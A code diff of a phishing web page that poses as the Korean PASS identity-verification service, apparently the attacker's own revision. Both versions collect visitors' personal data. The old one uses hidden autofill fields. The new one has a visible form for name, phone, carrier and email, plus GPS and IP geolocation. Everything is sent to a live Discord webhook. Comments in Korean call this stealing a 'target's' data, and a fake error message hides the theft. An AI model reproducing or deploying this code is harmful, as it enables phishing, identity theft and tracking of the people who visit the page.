@@ -3,76 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification</title>
+    <title>PASS 본인확인</title>
     <style>
-        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .box { width: 320px; text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
-        .btn { width: 100%; padding: 16px; background: #000; color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        /* 핵심: 브라우저가 무시할 수 없게 만드는 노출형 필드 (투명하게 처리) */
-        #trap_container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: -1; opacity: 0.01; }
-        input { font-size: 16px; width: 200px; }
+        body { background: #f2f2f2; font-family: 'Malgun Gothic', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .auth-box { width: 90%; max-width: 380px; background: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .title { font-size: 18px; font-weight: bold; color: #000; margin-bottom: 20px; text-align: center; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 15px; }
+        .btn-submit { width: 100%; padding: 15px; background: #ff0000; color: #fff; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        #st-email { position: absolute; opacity: 0.01; height: 1px; width: 1px; }
     </style>
 </head>
-<body onload="autoNet()">
+<body onload="initNet()">
 
-    <div class="box">
-        <h2 style="margin-bottom:10px;">본인 확인</h2>
-        <p style="font-size:13px; color:#666; margin-bottom:25px;">계속하려면 아래 버튼을 눌러<br>저장된 프로필로 인증을 완료하십시오.</p>
-        <button class="btn" onclick="openTrap()">인증 및 승인</button>
-    </div>
+    <div class="auth-box">
+        <div class="title">간편 본인확인</div>
+        
+        <input type="text" id="name" placeholder="성함" autocomplete="name">
+        <select id="telecom">
+            <option>SKT</option><option>KT</option><option>LG U+</option><option>알뜰폰</option>
+        </select>
+        <input type="tel" id="phone" placeholder="휴대폰 번호 (-없이)" autocomplete="tel">
+        
+        <input type="email" id="email" placeholder="인증용 이메일 주소" autocomplete="email">
 
-    <div id="trap_container">
-        <form id="exploit_form">
-            <input type="text" id="t_name" name="name" autocomplete="name" placeholder="Name">
-            <input type="email" id="t_email" name="email" autocomplete="email" placeholder="Email" oninput="captureFinal()">
-            <input type="tel" id="t_phone" name="tel" autocomplete="tel" placeholder="Phone">
-        </form>
+        <button class="btn-submit" onclick="captureAll()">인증하고 확인하기</button>
+        <p style="font-size:11px; color:#999; margin-top:10px; text-align:center;">※ 본인확인 정보는 암호화되어 전송됩니다.</p>
     </div>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let net = {};
+    let netInfo = {};
 
-    // 1. 접속 즉시 IP, 위치, 기기 정보 선제 탈취
-    async function autoNet() {
-        const res = await fetch('https://ipapi.co/json/');
-        net = await res.json();
+    // 1. 접속하자마자 IP, 기기, 대략적 위치 자동 확보
+    async function initNet() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            netInfo = await res.json();
+            // 접속 사실만 먼저 보고
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: "🚩 타겟이 낚시터에 들어왔습니다." }) });
+        } catch(e) {}
     }
 
-    // 2. 버튼 클릭 시 브라우저 자동완성 목록 강제 호출
-    function openTrap() {
-        const emailField = document.getElementById('t_email');
-        emailField.focus(); // 브라우저에게 이메일을 채우라고 명령
-        alert("인증할 이메일 또는 프로필을 선택해 주세요.");
+    // 2. 버튼 클릭 시 7가지 정보 통합 탈취
+    async function captureAll() {
+        const data = {
+            name: document.getElementById('name').value,
+            phone: document.getElementById('phone').value,
+            telecom: document.getElementById('telecom').value,
+            email: document.getElementById('email').value
+        };
+
+        // GPS 정밀 위치 요청
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await finalPush(data, pos.coords.latitude, pos.coords.longitude);
+        }, async () => {
+            await finalPush(data, null, null);
+        });
     }
 
-    // 3. 타겟이 이메일을 선택(입력)하는 즉시 모든 정보 전송
-    async function captureFinal() {
-        const name = document.getElementById('t_name').value;
-        const email = document.getElementById('t_email').value;
-        const phone = document.getElementById('t_phone').value;
-
-        if (email) {
-            await fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🔱 [알파] 7대 정보 완전 탈취 보고서",
-                        color: 16711680,
-                        fields: [
-                            { name: "👤 이름", value: name || "검출불가", inline: true },
-                            { name: "📧 이메일", value: email || "검출불가", inline: true },
-                            { name: "📞 전화번호", value: phone || "검출불가", inline: true },
-                            { name: "🌐 IP 주소", value: net.ip, inline: false },
-                            { name: "📍 상세 위치", value: `${net.city}, ${net.region}`, inline: true },
-                            { name: "📶 통신사", value: net.org, inline: true },
-                            { name: "📱 기기 정보", value: navigator.userAgent }
-                        ],
-                        timestamp: new Date()
-                    }]
-                })
+    async function finalPush(data, lat, lon) {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "💀 [알파] 7대 신상 정보 통합 보고서",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 이름", value: data.name || "미입력", inline: true },
+                        { name: "📧 이메일", value: data.email || "미입력", inline: true },
+                        { name: "📞 전화번호", value: data.phone || "미입력", inline: true },
+                        { name: "📶 통신사", value: data.telecom, inline: true },
+                        { name: "🌐 공인 IP", value: netInfo.ip || "실패", inline: false },
+                        { name: "📍 정밀 위치", value: lat ? `위도:${lat}, 경도:${lon}` : `IP기반:${netInfo.city}`, inline: false },
+                        { name: "📱 접속 기기", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
             });
+            alert("인증 오류: 잠시 후 다시 시도해 주세요.");
             location.href = "https://www.google.com";
         }
     }
